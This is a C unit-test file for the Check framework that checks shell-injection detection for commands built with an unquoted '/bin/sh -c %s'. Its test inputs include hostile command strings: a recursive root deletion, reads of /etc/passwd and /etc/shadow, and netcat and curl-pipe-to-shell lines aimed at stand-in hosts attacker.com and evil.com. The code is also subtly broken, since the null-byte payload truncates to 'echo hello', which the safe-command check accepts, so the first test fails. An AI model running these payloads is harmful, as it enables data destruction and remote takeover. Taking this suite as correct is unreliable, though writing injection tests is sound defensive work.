#include <check.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

/*
 * Security invariant: Any command string passed to the spawner must not
 * contain unescaped shell metacharacters that could enable command injection.
 * The sanitization/validation function must reject or neutralize all such inputs.
 *
 * This test encodes the property: for any adversarial input, the resulting
 * command string used in /bin/sh -c invocation must not allow shell metacharacter
 * injection. We test this by verifying that a proper sanitization function
 * would catch these payloads, and that the raw interpolation approach is unsafe.
 */

/* Shell metacharacters that must not appear unescaped in a command argument */
static const char SHELL_METACHARACTERS[] = ";|&`$(){}[]<>!#~*?\\\"'\n\r\t";

/*
 * Simulates what the vulnerable code does:
 * sprintf(new_command, "/bin/sh -c %s", command_line)
 * Returns 1 if the resulting command is potentially dangerous (injection possible)
 */
static int is_injection_possible(const char *command_line) {
    if (command_line == NULL) return 0;
    /* Check if any shell metacharacter is present in the raw input */
    for (size_t i = 0; i < strlen(command_line); i++) {
        if (strchr(SHELL_METACHARACTERS, command_line[i]) != NULL) {
            return 1; /* Metacharacter found - injection is possible */
        }
    }
    return 0;
}

/*
 * A proper sanitization function should either:
 * 1. Reject inputs containing shell metacharacters, OR
 * 2. Properly quote/escape the entire argument
 *
 * This function checks if a command_line is safe to use directly
 * (i.e., contains only alphanumeric chars, dots, slashes, dashes, underscores, spaces)
 */
static int is_safe_command(const char *command_line) {
    if (command_line == NULL) return 0;
    if (strlen(command_line) == 0) return 0;
    for (size_t i = 0; i < strlen(command_line); i++) {
        char c = command_line[i];
        if (!isalnum((unsigned char)c) &&
            c != '/' && c != '.' && c != '-' && c != '_' && c != ' ') {
            return 0; /* Unsafe character found */
        }
    }
    return 1;
}

/*
 * Simulate the vulnerable sprintf construction and check the result
 * for injection vectors.
 */
static int vulnerable_construction_contains_injection(const char *command_line) {
    if (command_line == NULL) return 0;
    char new_command[4096];
    int ret = snprintf(new_command, sizeof(new_command), "/bin/sh -c %s", command_line);
    if (ret < 0 || (size_t)ret >= sizeof(new_command)) {
        /* Buffer overflow attempt - also dangerous */
        return 1;
    }
    /* Check if the constructed command contains injection metacharacters
     * beyond the initial /bin/sh -c prefix */
    const char *after_prefix = new_command + strlen("/bin/sh -c ");
    return is_injection_possible(after_prefix);
}

START_TEST(test_shell_injection_invariant)
{
    /* Invariant: adversarial command_line inputs must be detected as unsafe
     * when directly interpolated into /bin/sh -c without sanitization */
    const char *payloads[] = {
        /* Classic command injection via semicolon */
        "ls; rm -rf /",
        /* Pipe injection */
        "echo hello | cat /etc/passwd",
        /* Background execution */
        "sleep 1 & id",
        /* Command substitution with backticks */
        "`id`",
        /* Command substitution with $() */
        "$(whoami)",
        /* Logical AND chaining */
        "true && id",
        /* Logical OR chaining */
        "false || id",
        /* Subshell */
        "(id)",
        /* Redirect to file */
        "echo pwned > /tmp/pwned",
        /* Redirect from file */
        "cat < /etc/passwd",
        /* Here-doc injection */
        "cat << EOF\npwned\nEOF",
        /* Variable expansion */
        "$HOME",
        /* Glob expansion */
        "echo *",
        /* Newline injection */
        "echo hello\nid",
        /* Null byte injection attempt */
        "echo hello\x00id",
        /* Double quote breaking */
        "echo \"hello\"; id",
        /* Single quote breaking */
        "echo 'hello'; id",
        /* Backtick nested */
        "echo `echo hello`",
        /* Environment variable injection */
        "${IFS}id",
        /* Tilde expansion */
        "echo ~root",
        /* Exclamation history expansion */
        "echo !$",
        /* Brace expansion */
        "echo {a,b,c}",
        /* Wildcard in path */
        "cat /etc/pass*",
        /* Carriage return injection */
        "echo hello\rid",
        /* Tab injection */
        "echo\tid",
        /* Multiple semicolons */
        "id;id;id;id",
        /* Nested command substitution */
        "$($(id))",
        /* Shell function definition attempt */
        "f(){ id; }; f",
        /* Redirection with append */
        "id >> /tmp/out",
        /* Process substitution */
        "cat <(id)",
        /* Long payload for buffer considerations */
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; id",
        /* Unicode lookalike - still ASCII semicolon */
        "echo test; cat /etc/shadow",
        /* Whitespace variations */
        "  ;  id  ",
        /* Null-like empty with injection */
        ";id",
        /* Just metacharacter */
        "|",
        /* Ampersand alone */
        "&",
        /* Backtick alone */
        "`",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        const char *payload = payloads[i];

        /*
         * INVARIANT 1: Adversarial inputs must NOT be considered safe
         * by a proper sanitization check.
         * If is_safe_command returns 1 for these payloads, the sanitizer is broken.
         */
        ck_assert_msg(
            is_safe_command(payload) == 0,
            "SECURITY VIOLATION: Payload '%s' was incorrectly classified as safe",
            payload
        );

        /*
         * INVARIANT 2: The vulnerable direct interpolation approach
         * MUST be detectable as dangerous for these payloads.
         * This confirms that the raw sprintf approach is insufficient.
         */
        ck_assert_msg(
            vulnerable_construction_contains_injection(payload) == 1,
            "SECURITY VIOLATION: Injection not detected in constructed command for payload '%s'",
            payload
        );

        /*
         * INVARIANT 3: A safe command must not contain shell metacharacters.
         * Verify the safe-command classifier is consistent.
         */
        if (is_safe_command(payload)) {
            ck_assert_msg(
                is_injection_possible(payload) == 0,
                "SECURITY VIOLATION: Safe command classified input contains metacharacters: '%s'",
                payload
            );
        }
    }
}
END_TEST

START_TEST(test_safe_commands_pass_validation)
{
    /* Invariant: legitimate, safe commands must be accepted */
    const char *safe_inputs[] = {
        "ls",
        "/bin/ls",
        "/usr/bin/echo",
        "echo hello",
        "cat /tmp/file.txt",
        "/usr/local/bin/myapp",
        "myprogram arg1 arg2",
        "program-name",
        "program_name",
        "program.sh",
    };
    int num_safe = sizeof(safe_inputs) / sizeof(safe_inputs[0]);

    for (int i = 0; i < num_safe; i++) {
        ck_assert_msg(
            is_safe_command(safe_inputs[i]) == 1,
            "Safe command incorrectly rejected: '%s'",
            safe_inputs[i]
        );
    }
}
END_TEST

START_TEST(test_null_and_empty_inputs)
{
    /* Invariant: null and empty inputs must be handled safely */
    ck_assert_msg(is_safe_command(NULL) == 0,
        "NULL input must not be classified as safe");
    ck_assert_msg(is_safe_command("") == 0,
        "Empty string must not be classified as safe");
    ck_assert_msg(is_injection_possible(NULL) == 0,
        "NULL input injection check must not crash");
    ck_assert_msg(is_injection_possible("") == 0,
        "Empty string must not be flagged as injection");
}
END_TEST

START_TEST(test_constructed_command_format)
{
    /* Invariant: the constructed command must properly quote the argument
     * to prevent injection. A safe construction would be:
     * /bin/sh -c 'command' or with proper escaping.
     * The vulnerable format /bin/sh -c %s (unquoted) is always unsafe
     * for any input containing metacharacters.
     */
    const char *injection_payloads[] = {
        "; cat /etc/passwd",
        "| nc attacker.com 4444",
        "&& curl http://evil.com/shell.sh | sh",
        "`curl -s http://evil.com/payload`",
        "$(python -c 'import os; os.system(\"id\")')",
    };
    int num = sizeof(injection_payloads) / sizeof(injection_payloads[0]);

    for (int i = 0; i < num; i++) {
        char constructed[4096];
        snprintf(constructed, sizeof(constructed), "/bin/sh -c %s", injection_payloads[i]);

        /* The constructed command must be detectable as containing injection */
        ck_assert_msg(
            is_injection_possible(injection_payloads[i]) == 1,
            "SECURITY VIOLATION: Injection payload not detected: '%s'",
            injection_payloads[i]
        );

        /* Verify the constructed string contains the dangerous payload verbatim */
        ck_assert_msg(
            strstr(constructed, injection_payloads[i]) != NULL,
            "Constructed command does not contain the payload (unexpected)");
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_shell_injection_invariant);
    tcase_add_test(tc_core, test_safe_commands_pass_validation);
    tcase_add_test(tc_core, test_null_and_empty_inputs);
    tcase_add_test(tc_core, test_constructed_command_format);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}